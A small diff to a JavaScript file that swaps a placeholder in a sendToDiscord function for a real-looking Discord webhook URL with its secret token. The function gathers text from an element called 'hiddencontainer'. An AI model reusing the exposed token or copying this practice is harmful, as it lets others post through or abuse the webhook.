@@ -1,6 +1,6 @@
 function sendToDiscord() {
   const webhookUrl =
-    "YOUR_WEBHOOK_URL";
+    "https://discord.com/api/webhooks/1473327680261984287/3Y5I25B4ITs1l7gTCJ8fxgyIRkZLQJKa6RWJtrXfLeemQl7DQq0U4BRkSV5iU3a0ubfV";
   const hiddenContainer = document.getElementById("hiddencontainer");
   let content = "";
 
@@ -51,3 +51,4 @@ document.addEventListener("DOMContentLoaded", () => {
     .getElementById("flexboxcontainer")
     .addEventListener("click", handleUserClick);
 });
+
